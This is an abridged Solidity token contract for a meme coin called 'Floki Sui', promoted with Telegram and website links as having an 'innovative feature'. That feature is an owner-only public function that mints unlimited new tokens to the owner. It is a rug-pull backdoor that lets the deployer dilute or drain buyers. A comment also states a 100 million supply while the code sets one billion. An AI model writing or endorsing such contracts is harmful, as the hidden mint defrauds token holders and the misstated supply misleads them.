//
// $FlokiSui proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FlokiSuiPortal
// 📱 Website ::https://flokisui.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FlokiSui(uint256 amount) public onlyOwner {
 _FlokiSui(msg.sender, amount);
    }
    ...
    function _FlokiSui(address account, uint256 amount) internal virtual {
...
contract $FlokiSui is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Floki Sui", "FLOKISUI") {
     _FlokiSui(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}